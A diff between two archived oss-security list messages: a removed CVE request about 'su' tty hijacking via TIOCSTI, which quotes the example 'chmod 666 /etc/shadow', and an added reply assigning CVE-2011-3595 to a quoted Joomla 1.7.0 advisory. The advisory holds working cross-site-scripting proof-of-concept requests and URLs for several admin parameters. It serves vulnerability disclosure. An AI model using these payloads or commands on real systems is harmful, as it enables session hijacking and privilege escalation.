@@ -1,36 +1,158 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/06/02/3
-Message-ID: <4DE7C702.4050502@redhat.com>
-Date: Thu, 02 Jun 2011 19:23:14 +0200
-From: Jan Lieskovsky <jlieskov@...hat.com>
-To: "Steven M. Christey" <coley@...us.mitre.org>
-CC: oss-security <oss-security@...ts.openwall.com>, Russell Coker <rcoker@...hat.com>, Daniel Ruoso <daniel@...so.com>
-Subject: CVE request -- coreutils -- tty hijacking possible in "su" via TIOCSTI ioctl
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/10/04/7
+Message-ID: <85aa3709-c24c-4e0c-beef-cc38b1ac0b5d@zmail01.collab.prod.int.phx2.redhat.com>
+Date: Tue, 04 Oct 2011 14:04:21 -0400 (EDT)
+From: Josh Bressers <bressers@...hat.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: CVE Request: Joomla! 1.7.0 | Multiple Cross Site Scripting (XSS) Vulnerabilities
 Content-Type: text/plain; charset=utf-8
 
+Please use CVE-2011-3595
 
-Hello Josh, Steve, vendors,
+Thanks.
 
-   based on Debian BTS report:
-   [1] http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=628843
-       (first CVE-2011-XXYY required for Debian case)
+-- 
+    JB
 
-looked more into original report:
-[2] https://bugzilla.redhat.com/show_bug.cgi?id=173008
 
-and the first paragraph of [2] suggests:
-"When starting a program via "su - user -c program" the user session
-can escape to the parent session by using the TIOCSTI ioctl to push
-characters into the input buffer.  This allows for example a non-root
-session to push "chmod 666 /etc/shadow" or similarly bad commands into
-the input buffer such  that after the end of the session they are
-executed."
-
-this should get a CVE-2005-YYZZ CVE id.
-
-Could you allocate these?
-
-Thank you & Regards, Jan.
---
-Jan iankko Lieskovsky / Red Hat Security Response Team
-
+----- Original Message -----
+> Joomla! 1.7.0 | Multiple Cross Site Scripting (XSS) Vulnerabilities
+> 
+> 
+> 
+> 1. OVERVIEW
+> 
+> Joomla! 1.7.0 (stable version) is vulnerable to multiple Cross Site
+> Scripting issues.
+> 
+> 
+> 2. BACKGROUND
+> 
+> Joomla is a free and open source content management system (CMS) for
+> publishing content on the World Wide Web and intranets. It comprises
+> a
+> model–view–controller (MVC) Web application framework that can also
+> be
+> used independently.
+> Joomla is written in PHP, uses object-oriented programming (OOP)
+> techniques and software design patterns, stores data in a MySQL
+> database, and includes features such as page caching, RSS feeds,
+> printable versions of pages, news flashes, blogs, polls, search, and
+> support for language internationalization.
+> 
+> 
+> 3. VULNERABILITY DESCRIPTION
+> 
+> Several parameters (searchword, extension, asset, author ) in Joomla!
+> Core components are not properly sanitized upon submission to the
+> /index.php url, which allows attacker to conduct Cross Site Scripting
+> attack. This may allow an attacker to create a specially crafted URL
+> that would execute arbitrary script code in a victim's browser.
+> 
+> 
+> 4. VERSION AFFECTED
+> 
+> 1.7.0 <=
+> 
+> 
+> 5. PROOF-OF-CONCEPT/EXPLOIT
+> 
+> 
+> component: com_search, parameter: searchword (Browser: IE, Konqueror)
+> =====================================================================
+> This is our previously reported issue -
+> http://bl0g.yehg.net/2011/07/joomla-170-rc-and-lower-multiple-cross.html
+> http://bl0g.yehg.net/2011/06/joomla-163-and-lower-multiple-cross.html
+> We have no idea what made Joomla! guys so difficult to fix this
+> issue.
+> 
+> 
+> [REQUEST]
+> POST /joomla17_noseo/index.php HTTP/1.1
+> Host: localhost
+> Accept: */*
+> Accept-Language: en
+> User-Agent: MSIE 8.0
+> Connection: close
+> Referer: http://localhost/joomla17_noseo
+> 
+> Content-Type: application/x-www-form-urlencoded
+> Content-Length: 456
+> 
+> 
+> task=search&Itemid=435&searchword=Search';onunload=function(){x=confirm(String.fromCharCode(89,111,117,39,118,101,32,103,111,116,32,97,32,109,101,115,115,97,103,101,32,102,114,111,109,32,65,100,109,105,110,105,115,116,114,97,116,111,114,33,10,68,111,32,121,111,117,32,119,97,110,116,32,116,111,32,103,111,32,116,111,32,73,110,98,111,120,63));alert(String.fromCharCode(89,111,117,39,118,101,32,103,111,116,32,88,83,83,33));};//xsssssssssss&option=com_search
+> [/REQUEST]
+> 
+> 
+> ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+> 
+> User Login is required to execute the following XSSes.
+> 
+> 
+> Parameter: extension, Component: com_categories
+> ====================================================
+> 
+> http://localhost/joomla17_noseo/administrator/index.php?option=com_categories&extension=com_content%20%22onmouseover=%22alert%28/XSS/%29%22style=%22width:3000px!important;height:3000px!important;z-index:999999;position:absolute!important;left:0;top:0;%22%20x=%22
+> 
+> 
+> 
+> Parameter: asset , Component: com_media
+> ====================================================
+> 
+> http://localhost/joomla17_noseo/administrator/index.php?option=com_media&view=images&tmpl=component&e_name=jform_articletext&asset=1%22%20onmouseover=%22alert%28/XSS/%29%22style=%22width:3000px!important;height:3000px!important;z-index:999999;position:absolute!important;left:0;top:0;%22x=%22&author=
+> 
+> 
+> 
+> Parameter: author, Component: com_media
+> ====================================================
+> 
+> http://localhost/joomla17_noseo/administrator/index.php?option=com_media&view=images&tmpl=component&e_name=jform_articletext&asset=&author=1%22%20onmouseover=%22alert%28/XSS/%29%22style=%22width:3000px!important;height:3000px!important;z-index:999999;position:absolute!important;left:0;top:0;%22x=%22
+> 
+> 
+> 
+> ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+> 
+> 
+> 6. IMPACT
+> 
+> Attackers can compromise currently logged-in user/administrator
+> session and impersonate arbitrary user actions available under
+> /administrator/ functions.
+> 
+> 
+> 7. SOLUTION
+> 
+> Upgrade to Joomla! 1.7.1-stable or higher.
+> 
+> 
+> 8. VENDOR
+> 
+> Joomla! Developer Team
+> http://www.joomla.org
+> 
+> 
+> 9. CREDIT
+> 
+> This vulnerability was discovered by Aung Khant, http://yehg.net, YGN
+> Ethical Hacker Group, Myanmar.
+> 
+> 
+> 10. DISCLOSURE TIME-LINE
+> 
+> 2011-07-29: notified vendor
+> 2011-09-26: patched version, 1.7.1-stable, released
+> 2011-09-29: vulnerability disclosed
+> 
+> 
+> 11. REFERENCES
+> 
+> Original Advisory URL:
+> http://yehg.net/lab/pr0js/advisories/joomla/core/%5Bjoomla_1.7.0-stable%5D_cross_site_scripting%28XSS%29
+> 
+> Vendor Advisory URLs:
+> http://developer.joomla.org/security/news/367-20110901-core-xss-vulnerability
+> http://developer.joomla.org/security/news/368-20110902-core-xss-vulnerability
+> 
+> 
+> #yehg [2011-09-29]
+> 
